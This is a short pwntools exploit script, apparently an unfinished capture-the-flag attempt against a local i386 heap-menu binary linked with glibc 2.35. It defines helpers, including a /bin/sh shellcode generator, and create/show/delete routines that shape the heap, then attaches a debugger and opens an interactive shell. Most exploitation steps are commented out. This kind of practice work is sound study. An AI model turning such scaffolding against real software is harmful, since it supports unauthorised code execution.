from pwn import *
from LibcSearcher import *

context(os='linux', arch='i386', log_level='debug')

sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda x,y:p.sendafter(x,y)
sla=lambda x,y:p.sendlineafter(x,y)
rc=lambda x:p.recv(x)
rl=lambda :p.recvline()
ru=lambda x:p.recvuntil(x)
ita=lambda :p.interactive()
slc=lambda :asm(shellcraft.sh())
uu64=lambda x:u64(x.ljust(8,b'\0'))
uu32=lambda x:u32(x.ljust(4,b'\0'))
def gdba(x=''):
	if type(p)==pwnlib.tubes.remote.remote:
		return
	elif type(p)==pwnlib.tubes.process.process:
		gdb.attach(p,x)
		pause()
p=process('./main')
elf=ELF('./main')
libc=ELF('/home/cc/glibc-all-in-one/libs/2.35-0ubuntu3_i386/libc.so.6')
# p=remote()
def create2(need,data):
	sla(b'choose : ','1')
	sla(b'need : ',str(need).encode())
	for i in range(16):
		sla(b'data.\n',data)
		sla(b'want?\n',b'2')
def create():
	sla(b'choose : ','1')
	sla(b'need : ','50')
	for i in range(15):
		sla(b'data.\n',b'v'*0x32)
		sla(b'want?\n',b'2')
	sla(b'data.\n',b'6'*0x32)
	sla(b'want?\n',b'2')
def show(index):
	sla(b'choose : ',b'2')
	sla(b'index : ',str(index).encode())
def delete():
	sla(b'choose : ',b'3')
create()
create()
create()
# create2(50,b'a'*0x30)
# create2(50,b'b'*0x30)
# create2(50,b'c'*0x30)
gdba()
# # show(2)
# delete()
# pause()
delete()
# delete()
print('del 2')
# pause()
# create2(50,b'rrrr')
# print('create rrrr')
pause()
# delete()
# create2(50,b'rrrr')
# delete()
# create()
# create()
ita()
	
	